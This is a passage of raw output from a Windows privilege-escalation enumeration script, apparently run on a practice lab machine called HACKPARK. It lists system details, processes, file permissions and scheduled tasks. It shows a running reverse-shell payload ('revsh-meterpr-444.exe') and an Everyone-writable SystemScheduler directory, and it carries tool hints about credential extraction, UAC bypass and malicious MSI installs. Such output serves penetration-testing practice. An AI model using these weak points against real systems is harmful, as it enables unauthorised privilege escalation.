Product ID:                00252-70000-00000-AA886                                                                            
Original Install Date:     8/3/2019, 10:43:23 AM                                                                              
System Boot Time:          6/7/2024, 11:20:41 AM                                                                              
System Manufacturer:       Xen                                                                                                
System Model:              HVM domU                                                                                           
System Type:               x64-based PC                                                                                       
Processor(s):              1 Processor(s) Installed.                                                                          
                           [01]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~2300 Mhz                                  
BIOS Version:              Xen 4.11.amazon, 8/24/2006                                                                         
Windows Directory:         C:\Windows                                                                                         
System Directory:          C:\Windows\system32                                                                                
Boot Device:               \Device\HarddiskVolume1                                                                            
System Locale:             en-us;English (United States)                                                                      
Input Locale:              en-us;English (United States)                                                                      
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)                                                             
Total Physical Memory:     4,096 MB                                                                                           
Available Physical Memory: 3,436 MB                                                                                           
Virtual Memory: Max Size:  5,504 MB                                                                                           
Virtual Memory: Available: 4,838 MB                                                                                           
Virtual Memory: In Use:    666 MB                                                                                             
Page File Location(s):     C:\pagefile.sys                                                                                    
Domain:                    WORKGROUP                                                                                          
Logon Server:              \\HACKPARK                                                                                         
Hotfix(s):                 8 Hotfix(s) Installed.                                                                             
                           [01]: KB2919355                                                                                    
                           [02]: KB2919442                                                                                    
                           [03]: KB2937220                                                                                    
                           [04]: KB2938772                                                                                    
                           [05]: KB2939471                                                                                    
                           [06]: KB2949621                                                                                    
                           [07]: KB3035131                                                                                    
                           [08]: KB3060716                                                                                    
Network Card(s):           1 NIC(s) Installed.                                                                                
                           [01]: AWS PV Network Device                                                                        
                                 Connection Name: Ethernet 2                                                                  
                                 DHCP Enabled:    Yes                                                                         
                                 DHCP Server:     10.10.0.1                                                                   
                                 IP address(es)                                                                               
                                 [01]: 10.10.253.222                                                                          
                                 [02]: fe80::e0ed:ad91:2492:caf0                                                              
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.               
                                                                                                                              
Caption                                     Description      HotFixID   InstalledOn                                           
http://support.microsoft.com/?kbid=2919355  Update           KB2919355  3/21/2014                                             
http://support.microsoft.com/?kbid=2919442  Update           KB2919442  3/21/2014                                             
http://support.microsoft.com/?kbid=2937220  Update           KB2937220  3/21/2014                                             
http://support.microsoft.com/?kbid=2938772  Update           KB2938772  3/21/2014                                             
http://support.microsoft.com/?kbid=2939471  Update           KB2939471  3/21/2014                                             
http://support.microsoft.com/?kbid=2949621  Hotfix           KB2949621  3/21/2014                                             
http://support.microsoft.com/?kbid=3035131  Security Update  KB3035131  8/5/2019                                              
http://support.microsoft.com/?kbid=3060716  Security Update  KB3060716  8/5/2019                                              
                                                                                                                              
                                                                                                                              
                                                                                                                              
 [+] DATE and TIME                                                                                                            
   [i] You may need to adjust your local date/time to exploit some vulnerability                                              
Fri 06/07/2024                                                                                                                
12:36 PM                                                                                                                      
                                                                                                                              
 [+] Audit Settings                                                                                                           
   [i] Check what is being logged                                                                                             
                                                                                                                              
                                                                                                                              
 [+] WEF Settings                                                                                                             
   [i] Check where are being sent the logs                                                                                    
                                                                                                                              
 [+] LAPS installed?                                                                                                          
   [i] Check what is being logged                                                                                             
                                                                                                                              
 [+] LSA protection?                                                                                                          
   [i] Active if "1"                                                                                                          
                                                                                                                              
                                                                                                                              
 [+] Credential Guard?                                                                                                        
   [i] Active if "1" or "2"                                                                                                   
                                                                                                                              
                                                                                                                              
                                                                                                                              
 [+] WDigest?                                                                                                                 
   [i] Plain-text creds in memory if "1"                                                                                      
                                                                                                                              
 [+] Number of cached creds                                                                                                   
   [i] You need System-rights to extract them                                                                                 
                                                                                                                              
                                                                                                                              
 [+] UAC Settings                                                                                                             
   [i] If the results read ENABLELUA REG_DWORD 0x1, part or all of the UAC components are on                                  
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#basic-uac-bypass-full-file-system-access                                                                                                                            
                                                                                                                              
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System                                                  
    EnableLUA    REG_DWORD    0x1                                                                                             
                                                                                                                              
                                                                                                                              
 [+] Registered Anti-Virus(AV)                                                                                                
ERROR:                                                                                                                        
Description = Invalid namespace                                                                                               
                                                                                                                              
Checking for defender whitelisted PATHS                                                                                       
 [+] PowerShell settings                                                                                                      
PowerShell v2 Version:                                                                                                        
                                                                                                                              
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine                                                           
    PowerShellVersion    REG_SZ    2.0                                                                                        
                                                                                                                              
PowerShell v5 Version:                                                                                                        
                                                                                                                              
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PowerShell\3\PowerShellEngine                                                           
    PowerShellVersion    REG_SZ    4.0                                                                                        
                                                                                                                              
Transcriptions Settings:                                                                                                      
Module logging settings:                                                                                                      
Scriptblog logging settings:                                                                                                  
                                                                                                                              
PS default transcript history                                                                                                 
                                                                                                                              
Checking PS history file                                                                                                      
                                                                                                                              
 [+] MOUNTED DISKS                                                                                                            
   [i] Maybe you find something interesting                                                                                   
Caption                                                                                                                       
C:                                                                                                                            
                                                                                                                              
                                                                                                                              
                                                                                                                              
 [+] ENVIRONMENT                                                                                                              
   [i] Interesting information?                                                                                               
                                                                                                                              
ALLUSERSPROFILE=C:\ProgramData                                                                                                
APPDATA=C:\Users\Administrator\AppData\Roaming                                                                                
CommonProgramFiles=C:\Program Files (x86)\Common Files                                                                        
CommonProgramFiles(x86)=C:\Program Files (x86)\Common Files                                                                   
CommonProgramW6432=C:\Program Files\Common Files                                                                              
COMPUTERNAME=HACKPARK                                                                                                         
ComSpec=C:\Windows\system32\cmd.exe                                                                                           
CurrentFolder=c:\Windows\Temp\                                                                                                
CurrentLine= 0x1B[33m[+]0x1B[97m ENVIRONMENT                                                                                  
E=0x1B[                                                                                                                       
expl=no                                                                                                                       
FP_NO_HOST_CHECK=NO                                                                                                           
HOMEDRIVE=C:                                                                                                                  
HOMEPATH=\Users\Administrator                                                                                                 
LOCALAPPDATA=C:\Users\Administrator\AppData\Local                                                                             
LOGONSERVER=\\HACKPARK                                                                                                        
long=false                                                                                                                    
NUMBER_OF_PROCESSORS=2                                                                                                        
OS=Windows_NT                                                                                                                 
Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\                      
PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC                                                                 
Percentage=1                                                                                                                  
PercentageTrack=19                                                                                                            
PROCESSOR_ARCHITECTURE=x86                                                                                                    
PROCESSOR_ARCHITEW6432=AMD64                                                                                                  
PROCESSOR_IDENTIFIER=Intel64 Family 6 Model 79 Stepping 1, GenuineIntel                                                       
PROCESSOR_LEVEL=6                                                                                                             
PROCESSOR_REVISION=4f01                                                                                                       
ProgramData=C:\ProgramData                                                                                                    
ProgramFiles=C:\Program Files (x86)                                                                                           
ProgramFiles(x86)=C:\Program Files (x86)                                                                                      
ProgramW6432=C:\Program Files                                                                                                 
PROMPT=$P$G                                                                                                                   
PSModulePath=C:\Windows\system32\WindowsPowerShell\v1.0\Modules\                                                              
PUBLIC=C:\Users\Public                                                                                                        
SESSIONNAME=Console                                                                                                           
SystemDrive=C:                                                                                                                
SystemRoot=C:\Windows                                                                                                         
TEMP=C:\Users\ADMINI~1\AppData\Local\Temp\1                                                                                   
TMP=C:\Users\ADMINI~1\AppData\Local\Temp\1                                                                                    
USERDOMAIN=HACKPARK                                                                                                           
USERDOMAIN_ROAMINGPROFILE=HACKPARK                                                                                            
USERNAME=Administrator                                                                                                        
USERPROFILE=C:\Users\Administrator                                                                                            
windir=C:\Windows                                                                                                             
                                                                                                                              
 [+] INSTALLED SOFTWARE                                                                                                       
   [i] Some weird software? Check for vulnerabilities in unknow software installed                                            
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#software                              
                                                                                                                              
Amazon                                                                                                                        
Common Files                                                                                                                  
Common Files                                                                                                                  
Internet Explorer                                                                                                             
Internet Explorer                                                                                                             
Microsoft.NET                                                                                                                 
SystemScheduler                                                                                                               
Windows Mail                                                                                                                  
Windows Mail                                                                                                                  
Windows NT                                                                                                                    
Windows NT                                                                                                                    
WindowsPowerShell                                                                                                             
WindowsPowerShell                                                                                                             
    InstallLocation    REG_SZ    C:\Program Files (x86)\SystemScheduler\                                                      
    InstallLocation    REG_SZ    C:\Program Files (x86)\SystemScheduler\                                                      
                                                                                                                              
 [+] Remote Desktop Credentials Manager                                                                                       
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#remote-desktop-credential-manager     
                                                                                                                              
 [+] WSUS                                                                                                                     
   [i] You can inject 'fake' updates into non-SSL WSUS traffic (WSUXploit)                                                    
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#wsus                                  
                                                                                                                              
 [+] RUNNING PROCESSES                                                                                                        
   [i] Something unexpected is running? Check for vulnerabilities                                                             
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#running-processes                     
                                                                                                                              
Image Name                     PID Services                                                                                   
========================= ======== ============================================                                               
System Idle Process              0 N/A                                                                                        
System                           4 N/A                                                                                        
smss.exe                       372 N/A                                                                                        
csrss.exe                      520 N/A                                                                                        
csrss.exe                      576 N/A                                                                                        
wininit.exe                    584 N/A                                                                                        
winlogon.exe                   612 N/A                                                                                        
services.exe                   668 N/A                                                                                        
lsass.exe                      676 SamSs                                                                                      
svchost.exe                    740 BrokerInfrastructure, DcomLaunch, LSM,                                                     
                                   PlugPlay, Power, SystemEventsBroker                                                        
svchost.exe                    784 RpcEptMapper, RpcSs                                                                        
dwm.exe                        864 N/A                                                                                        
svchost.exe                    872 Dhcp, EventLog, lmhosts, Wcmsvc                                                            
svchost.exe                    904 CertPropSvc, DsmSvc, gpsvc, iphlpsvc,                                                      
                                   LanmanServer, ProfSvc, Schedule, SENS,                                                     
                                   SessionEnv, ShellHWDetection, Themes,                                                      
                                   Winmgmt                                                                                    
svchost.exe                    956 EventSystem, FontCache, netprofm, nsi,                                                     
                                   W32Time, WinHttpAutoProxySvc                                                               
svchost.exe                   1020 CryptSvc, Dnscache, LanmanWorkstation,                                                     
                                   NlaSvc, WinRM                                                                              
svchost.exe                    860 BFE, DPS, MpsSvc                                                                           
spoolsv.exe                   1128 Spooler                                                                                    
amazon-ssm-agent.exe          1168 AmazonSSMAgent                                                                             
svchost.exe                   1232 AppHostSvc                                                                                 
LiteAgent.exe                 1268 AWSLiteAgent                                                                               
svchost.exe                   1324 TrkWks, UALSVC, UmRdpService                                                               
svchost.exe                   1352 W3SVC, WAS                                                                                 
WService.exe                  1416 WindowsScheduler                                                                           
WScheduler.exe                1552 N/A                                                                                        
Ec2Config.exe                 1648 Ec2Config                                                                                  
WmiPrvSE.exe                  1804 N/A                                                                                        
svchost.exe                   2020 TermService                                                                                
taskhostex.exe                2532 N/A                                                                                        
explorer.exe                  2608 N/A                                                                                        
ServerManager.exe             3012 N/A                                                                                        
WScheduler.exe                2708 N/A                                                                                        
msdtc.exe                     2800 MSDTC                                                                                      
revsh-meterpr-444.exe         2328 N/A                                                                                        
cmd.exe                       1496 N/A                                                                                        
conhost.exe                   2680 N/A                                                                                        
WhoAmI.exe                     108 N/A                                                                                        
WhoAmI.exe                    2868 N/A                                                                                        
Message.exe                    484 N/A                                                                                        
cmd.exe                       2436 N/A                                                                                        
conhost.exe                   1240 N/A                                                                                        
WhoAmI.exe                    2088 N/A                                                                                        
WmiPrvSE.exe                   912 N/A                                                                                        
TrustedInstaller.exe          1644 TrustedInstaller                                                                           
TiWorker.exe                  2852 N/A                                                                                        
tasklist.exe                  3028 N/A                                                                                        
                                                                                                                              
   [i] Checking file permissions of running processes (File backdooring - maybe the same files start automatically when Administrator logs in)                                                                                                              
C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe NT AUTHORITY\SYSTEM:(I)(F)                                                   
                                                 BUILTIN\Administrators:(I)(F)                                                
                                                                                                                              
C:\Program Files\Amazon\XenTools\LiteAgent.exe NT AUTHORITY\SYSTEM:(I)(F)                                                     
                                               BUILTIN\Administrators:(I)(F)                                                  
                                                                                                                              
C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)                                                                             
                                  BUILTIN\Administrators:(I)(F)                                                               
                                                                                                                              
C:\PROGRA~2\SYSTEM~1\WScheduler.exe Everyone:(I)(M)                                                                           
                                    BUILTIN\Administrators:(I)(F)                                                             
                                                                                                                              
C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe NT AUTHORITY\SYSTEM:(I)(F)                                             
                                                       BUILTIN\Administrators:(I)(F)                                          
                                                                                                                              
C:\Windows\Explorer.EXE NT SERVICE\TrustedInstaller:(F)                                                                       
                                                                                                                              
C:\Program Files (x86)\SystemScheduler\WScheduler.exe Everyone:(I)(M)                                                         
                                                      BUILTIN\Administrators:(I)(F)                                           
                                                                                                                              
C:\windows\temp\revsh-meterpr-444.exe NT AUTHORITY\SYSTEM:(I)(S,RD)                                                           
                                      BUILTIN\Administrators:(I)(F)                                                           
                                                                                                                              
C:\Windows\SysWOW64\cmd.exe NT SERVICE\TrustedInstaller:(F)                                                                   
                                                                                                                              
c:\Program Files (x86)\SystemScheduler\WhoAmI.exe Everyone:(I)(M)                                                             
                                                  BUILTIN\Administrators:(I)(F)                                               
                                                                                                                              
C:\PROGRA~2\SYSTEM~1\WhoAmI.exe Everyone:(I)(M)                                                                               
                                BUILTIN\Administrators:(I)(F)                                                                 
                                                                                                                              
C:\PROGRA~2\SYSTEM~1\Message.exe Everyone:(I)(M)                                                                              
                                 BUILTIN\Administrators:(I)(F)                                                                
                                                                                                                              
C:\Windows\SysWOW64\cmd.exe NT SERVICE\TrustedInstaller:(F)                                                                   
                                                                                                                              
C:\PROGRA~2\SYSTEM~1\WhoAmI.exe Everyone:(I)(M)                                                                               
                                BUILTIN\Administrators:(I)(F)                                                                 
                                                                                                                              
C:\Windows\sysWOW64\wbem\wmiprvse.exe NT SERVICE\TrustedInstaller:(F)                                                         
                                                                                                                              
C:\Windows\servicing\TrustedInstaller.exe NT SERVICE\TrustedInstaller:(F)                                                     
                                                                                                                              
C:\Windows\winsxs\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_6.3.9600.17031_none_fa50b3979b1bcb4a\TiWorker.exe NT SERVICE\TrustedInstaller:(F)                                                                                                 
                                                                                                                              
C:\Windows\SysWOW64\cmd.exe NT SERVICE\TrustedInstaller:(F)                                                                   
                                                                                                                              
C:\Windows\SysWOW64\Wbem\WMIC.exe NT SERVICE\TrustedInstaller:(F)                                                             
                                                                                                                              
C:\Windows\SysWOW64\find.exe NT SERVICE\TrustedInstaller:(F)                                                                  
                                                                                                                              
C:\Windows\SysWOW64\find.exe NT SERVICE\TrustedInstaller:(F)                                                                  
                                                                                                                              
C:\Windows\SysWOW64\find.exe NT SERVICE\TrustedInstaller:(F)                                                                  
                                                                                                                              
                                                                                                                              
   [i] Checking directory permissions of running processes (DLL injection)                                                    
C:\Program Files\Amazon\SSM\ NT SERVICE\TrustedInstaller:(I)(F)                                                               
                             BUILTIN\Administrators:(I)(F)                                                                    
                             BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)                                                        
                                                                                                                              
C:\Program Files\Amazon\Xentools\ NT SERVICE\TrustedInstaller:(I)(F)                                                          
                                  BUILTIN\Administrators:(I)(F)                                                               
                                  BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)                                                   
                                                                                                                              
C:\PROGRA~2\SYSTEM~1\ Everyone:(OI)(CI)(M)                                                                                    
                      BUILTIN\Administrators:(I)(F)                                                                           
                      BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)                                                               
                                                                                                                              
C:\PROGRA~2\SYSTEM~1\ Everyone:(OI)(CI)(M)                                                                                    
                      BUILTIN\Administrators:(I)(F)                                                                           
                      BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)                                                               
                                                                                                                              
C:\Program Files\Amazon\Ec2ConfigService\ NT SERVICE\TrustedInstaller:(I)(F)                                                  
                                          BUILTIN\Administrators:(I)(F)                                                       
                                          BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)                                           
                                                                                                                              
C:\Windows\ NT SERVICE\TrustedInstaller:(F)                                                                                   
            BUILTIN\Administrators:(M)                                                                                        
            BUILTIN\Administrators:(OI)(CI)(IO)(F)                                                                            
                                                                                                                              
C:\Program Files (x86)\SystemScheduler\ Everyone:(OI)(CI)(M)                                                                  
                                        BUILTIN\Administrators:(I)(F)                                                         
                                        BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)                                             
                                                                                                                              
C:\Windows\Temp\ NT AUTHORITY\SYSTEM:(OI)(CI)(S,RD)                                                                           
                 BUILTIN\Administrators:(F)                                                                                   
                 BUILTIN\Administrators:(OI)(CI)(IO)(F)                                                                       
                                                                                                                              
C:\Windows\SysWOW64\ NT SERVICE\TrustedInstaller:(F)                                                                          
                     BUILTIN\Administrators:(M)                                                                               
                     BUILTIN\Administrators:(OI)(CI)(IO)(F)                                                                   
                                                                                                                              
c:\Program Files (x86)\SystemScheduler\ Everyone:(OI)(CI)(M)                                                                  
                                        BUILTIN\Administrators:(I)(F)                                                         
                                        BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)                                             
                                                                                                                              
C:\PROGRA~2\SYSTEM~1\ Everyone:(OI)(CI)(M)                                                                                    
                      BUILTIN\Administrators:(I)(F)                                                                           
                      BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)                                                               
                                                                                                                              
C:\PROGRA~2\SYSTEM~1\ Everyone:(OI)(CI)(M)                                                                                    
                      BUILTIN\Administrators:(I)(F)                                                                           
                      BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)                                                               
                                                                                                                              
C:\Windows\SysWOW64\ NT SERVICE\TrustedInstaller:(F)                                                                          
                     BUILTIN\Administrators:(M)                                                                               
                     BUILTIN\Administrators:(OI)(CI)(IO)(F)                                                                   
                                                                                                                              
C:\PROGRA~2\SYSTEM~1\ Everyone:(OI)(CI)(M)                                                                                    
                      BUILTIN\Administrators:(I)(F)                                                                           
                      BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)                                                               
                                                                                                                              
C:\Windows\SysWOW64\wbem\ NT SERVICE\TrustedInstaller:(F)                                                                     
                          BUILTIN\Administrators:(M)                                                                          
                          BUILTIN\Administrators:(OI)(CI)(IO)(F)                                                              
                                                                                                                              
C:\Windows\servicing\ NT SERVICE\TrustedInstaller:(F)                                                                         
                                                                                                                              
C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_6.3.9600.17031_none_fa50b3979b1bcb4a\ NT SERVICE\TrustedInstaller:(OI)(CI)(F)                                                                                                     
                                                                                                                              
C:\Windows\SysWOW64\ NT SERVICE\TrustedInstaller:(F)                                                                          
                     BUILTIN\Administrators:(M)                                                                               
                     BUILTIN\Administrators:(OI)(CI)(IO)(F)                                                                   
                                                                                                                              
C:\Windows\SysWOW64\wbem\ NT SERVICE\TrustedInstaller:(F)                                                                     
                          BUILTIN\Administrators:(M)                                                                          
                          BUILTIN\Administrators:(OI)(CI)(IO)(F)                                                              
                                                                                                                              
C:\Windows\SysWOW64\ NT SERVICE\TrustedInstaller:(F)                                                                          
                     BUILTIN\Administrators:(M)                                                                               
                     BUILTIN\Administrators:(OI)(CI)(IO)(F)                                                                   
                                                                                                                              
C:\Windows\SysWOW64\ NT SERVICE\TrustedInstaller:(F)                                                                          
                     BUILTIN\Administrators:(M)                                                                               
                     BUILTIN\Administrators:(OI)(CI)(IO)(F)                                                                   
                                                                                                                              
C:\Windows\SysWOW64\ NT SERVICE\TrustedInstaller:(F)                                                                          
                     BUILTIN\Administrators:(M)                                                                               
                     BUILTIN\Administrators:(OI)(CI)(IO)(F)                                                                   
                                                                                                                              
                                                                                                                              
 [+] RUN AT STARTUP                                                                                                           
   [i] Check if you can modify any binary that is going to be executed by admin or if you can impersonate a not found binary  
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#run-at-startup                        
                                                                BUILTIN\Administrators:(I)(OI)(CI)(F)                         
                                                                                                                              
C:\Documents and Settings\All Users\Start Menu\Programs\Startup\desktop.ini BUILTIN\Administrators:(F)                        
                                                                            BUILTIN\Administrators:(I)(F)                     
                                                                                     BUILTIN\Administrators:(I)(F)            
                                                                                                                              
C:\Documents and Settings\Administrator\Start Menu\Programs\Startup NT AUTHORITY\SYSTEM:(OI)(CI)(F)                           
                                                                    BUILTIN\Administrators:(OI)(CI)(F)                        
                                                                    HACKPARK\Administrator:(OI)(CI)(F)                        
                                                                                                                              
C:\Documents and Settings\Administrator\Start Menu\Programs\Startup\desktop.ini NT AUTHORITY\SYSTEM:(F)                       
                                                                                BUILTIN\Administrators:(F)                    
                                                                                HACKPARK\Administrator:(F)                    
C:\Documents and Settings\Administrator\Start Menu\Programs\Startup\setwallpaper.lnk NT AUTHORITY\SYSTEM:(F)                  
                                                                                     BUILTIN\Administrators:(F)               
                                                                                     HACKPARK\Administrator:(F)               
                                                                                                                              
                                                             BUILTIN\Administrators:(I)(OI)(CI)(F)                            
                                                                                                                              
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini BUILTIN\Administrators:(F)                           
                                                                         BUILTIN\Administrators:(I)(F)                        
                                                                                  BUILTIN\Administrators:(I)(F)               
                                                                                                                              
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup NT AUTHORITY\SYSTEM:(OI)(CI)(F)          
                                                                                     BUILTIN\Administrators:(OI)(CI)(F)       
                                                                                     HACKPARK\Administrator:(OI)(CI)(F)       
                                                                                                                              
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini NT AUTHORITY\SYSTEM:(F)      
                                                                                                 BUILTIN\Administrators:(F)   
                                                                                                 HACKPARK\Administrator:(F)   
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\setwallpaper.lnk NT AUTHORITY\SYSTEM:(F) 
                                                                                                      BUILTIN\Administrators:(F)                                                                                                                            
                                                                                                      HACKPARK\Administrator:(F)                                                                                                                            
                                                                                                                              
                                                                                                                              
Folder: \                                                                                                                     
Ec2ConfigMonitorTask                     N/A                    Ready                                                         
                                                                                                                              
Folder: \Microsoft                                                                                                            
INFO: There are no scheduled tasks presently available at your access level.                                                  
                                                                                                                              
Folder: \Microsoft\Windows                                                                                                    
INFO: There are no scheduled tasks presently available at your access level.                                                  
                                                                                                                              
Folder: \Microsoft\Windows\.NET Framework                                                                                     
.NET Framework NGEN v4.0.30319           N/A                    Ready                                                         
.NET Framework NGEN v4.0.30319 64        N/A                    Ready                                                         
                                                                                                                              
Folder: \Microsoft\Windows\Active Directory Rights Management Services Client                                                 
AD RMS Rights Policy Template Management N/A                    Ready                                                         
                                                                                                                              
Folder: \Microsoft\Windows\AppID                                                                                              
SmartScreenSpecific                      N/A                    Ready                                                         
                                                                                                                              
Folder: \Microsoft\Windows\Application Experience                                                                             
AitAgent                                 N/A                    Ready                                                         
ProgramDataUpdater                       N/A                    Ready                                                         
                                                                                                                              
Folder: \Microsoft\Windows\ApplicationData                                                                                    
CleanupTemporaryState                    N/A                    Ready                                                         
                                                                                                                              
Folder: \Microsoft\Windows\AppxDeploymentClient                                                                               
                                                                                                                              
Folder: \Microsoft\Windows\Autochk                                                                                            
Proxy                                    N/A                    Ready                                                         
                                                                                                                              
Folder: \Microsoft\Windows\CertificateServicesClient                                                                          
SystemTask                               N/A                    Ready                                                         
UserTask                                 N/A                    Ready                                                         
                                                                                                                              
Folder: \Microsoft\Windows\Chkdsk                                                                                             
ProactiveScan                            N/A                    Ready                                                         
                                                                                                                              
Folder: \Microsoft\Windows\Customer Experience Improvement Program                                                            
Consolidator                             6/8/2024 1:00:00 AM    Ready                                                         
KernelCeipTask                           N/A                    Ready                                                         
UsbCeip                                  N/A                    Ready                                                         
                                                                                                                              
Folder: \Microsoft\Windows\Customer Experience Improvement Program\Server                                                     
ServerCeipAssistant                      6/8/2024 10:41:26 AM   Ready                                                         
                                                                                                                              
Folder: \Microsoft\Windows\Data Integrity Scan                                                                                
Data Integrity Scan                      7/5/2024 8:12:31 AM    Ready                                                         
Data Integrity Scan for Crash Recovery   N/A                    Ready                                                         
                                                                                                                              
Folder: \Microsoft\Windows\Defrag                                                                                             
ScheduledDefrag                          N/A                    Ready                                                         
                                                                                                                              
Folder: \Microsoft\Windows\Device Setup                                                                                       
Metadata Refresh                         N/A                    Ready                                                         
                                                                                                                              
Folder: \Microsoft\Windows\IME                                                                                                
                                                                                                                              
Folder: \Microsoft\Windows\MemoryDiagnostic                                                                                   
                                                                                                                              
Folder: \Microsoft\Windows\MUI                                                                                                
LPRemove                                 N/A                    Ready                                                         
                                                                                                                              
Folder: \Microsoft\Windows\Multimedia                                                                                         
                                                                                                                              
Folder: \Microsoft\Windows\NetCfg                                                                                             
BindingWorkItemQueueHandler              N/A                    Ready                                                         
                                                                                                                              
Folder: \Microsoft\Windows\NetTrace                                                                                           
GatherNetworkInfo                        N/A                    Ready                                                         
                                                                                                                              
Folder: \Microsoft\Windows\PI                                                                                                 
Secure-Boot-Update                       N/A                    Ready                                                         
Sqm-Tasks                                N/A                    Ready                                                         
                                                                                                                              
Folder: \Microsoft\Windows\PLA                                                                                                
                                                                                                                              
Folder: \Microsoft\Windows\Plug and Play                                                                                      
Device Install Group Policy              N/A                    Ready                                                         
Device Install Reboot Required           N/A                    Ready                                                         
Plug and Play Cleanup                    N/A                    Ready                                                         
Sysprep Generalize Drivers               N/A                    Ready                                                         
                                                                                                                              
Folder: \Microsoft\Windows\Power Efficiency Diagnostics                                                                       
AnalyzeSystem                            N/A                    Ready                                                         
                                                                                                                              
Folder: \Microsoft\Windows\RAC                                                                                                
                                                                                                                              
Folder: \Microsoft\Windows\Ras                                                                                                
MobilityManager                          N/A                    Ready                                                         
                                                                                                                              
Folder: \Microsoft\Windows\Registry                                                                                           
RegIdleBackup                            N/A                    Ready                                                         
                                                                                                                              
Folder: \Microsoft\Windows\Server Manager                                                                                     
CleanupOldPerfLogs                       N/A                    Ready                                                         
ServerManager                            N/A                    Ready                                                         
                                                                                                                              
Folder: \Microsoft\Windows\Servicing                                                                                          
StartComponentCleanup                    N/A                    Ready                                                         
                                                                                                                              
Folder: \Microsoft\Windows\Shell                                                                                              
CreateObjectTask                         N/A                    Ready                                                         
                                                                                                                              
Folder: \Microsoft\Windows\Software Inventory Logging                                                                         
                                                                                                                              
Folder: \Microsoft\Windows\SoftwareProtectionPlatform                                                                         
SvcRestartTask                           6/14/2024 11:22:10 AM  Ready                                                         
                                                                                                                              
Folder: \Microsoft\Windows\SpacePort                                                                                          
SpaceAgentTask                           N/A                    Ready                                                         
                                                                                                                              
Folder: \Microsoft\Windows\Storage Tiers Management                                                                           
Storage Tiers Management Initialization  N/A                    Ready                                                         
                                                                                                                              
Folder: \Microsoft\Windows\Task Manager                                                                                       
Interactive                              N/A                    Ready                                                         
                                                                                                                              
Folder: \Microsoft\Windows\TaskScheduler                                                                                      
Maintenance Configurator                 6/8/2024 1:00:00 AM    Ready                                                         
Manual Maintenance                       N/A                    Ready                                                         
Regular Maintenance                      6/8/2024 3:28:23 AM    Ready                                                         
                                                                                                                              
Folder: \Microsoft\Windows\TextServicesFramework                                                                              
MsCtfMonitor                             N/A                    Running                                                       
                                                                                                                              
Folder: \Microsoft\Windows\Time Synchronization                                                                               
SynchronizeTime                          N/A                    Ready                                                         
                                                                                                                              
Folder: \Microsoft\Windows\Time Zone                                                                                          
SynchronizeTimeZone                      N/A                    Ready                                                         
                                                                                                                              
Folder: \Microsoft\Windows\TPM                                                                                                
Tpm-Maintenance                          N/A                    Ready                                                         
                                                                                                                              
Folder: \Microsoft\Windows\UPnP                                                                                               
UPnPHostConfig                           N/A                    Ready                                                         
                                                                                                                              
Folder: \Microsoft\Windows\User Profile Service                                                                               
                                                                                                                              
Folder: \Microsoft\Windows\WDI                                                                                                
ResolutionHost                           N/A                    Ready                                                         
                                                                                                                              
Folder: \Microsoft\Windows\Windows Error Reporting                                                                            
QueueReporting                           N/A                    Ready                                                         
                                                                                                                              
Folder: \Microsoft\Windows\Windows Filtering Platform                                                                         
BfeOnServiceStartTypeChange              N/A                    Ready                                                         
                                                                                                                              
Folder: \Microsoft\Windows\WindowsColorSystem                                                                                 
                                                                                                                              
Folder: \Microsoft\Windows\WindowsUpdate                                                                                      
Scheduled Start                          N/A                    Ready                                                         
                                                                                                                              
Folder: \Microsoft\Windows\Wininet                                                                                            
CacheTask                                N/A                    Running                                                       
                                                                                                                              
Folder: \Microsoft\Windows\Workplace Join                                                                                     
                                                                                                                              
Folder: \Microsoft\Windows\WS                                                                                                 
WSTask                                   N/A                    Ready                                                         
                                                                                                                              
 [+] AlwaysInstallElevated?                                                                                                   
   [i] If '1' then you can install a .msi file with admin privileges ;)                                                       
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#alwaysinstallelevated                 
                                                                                                                              
[*] NETWORK                                                                                                                   
 [+] CURRENT SHARES                                                                                                           
                                                                                                                              
Share name   Resource                        Remark                                                                           
                                                                                                                              
-------------------------------------------------------------------------------                                               
C$           C:\                             Default share                                                                    
IPC$                                         Remote IPC                                                                       
ADMIN$       C:\Windows                      Remote Admin                                                                     
The command completed successfully.                                                                                           
                                                                                                                              
                                                                                                                              
 [+] INTERFACES                                                                                                               
                                                                                                                              
Windows IP Configuration                                                                                                      
                                                                                                                              
   Host Name . . . . . . . . . . . . : hackpark                                                                               
   Primary Dns Suffix  . . . . . . . :                                                                                        
   Node Type . . . . . . . . . . . . : Hybrid                                                                                 
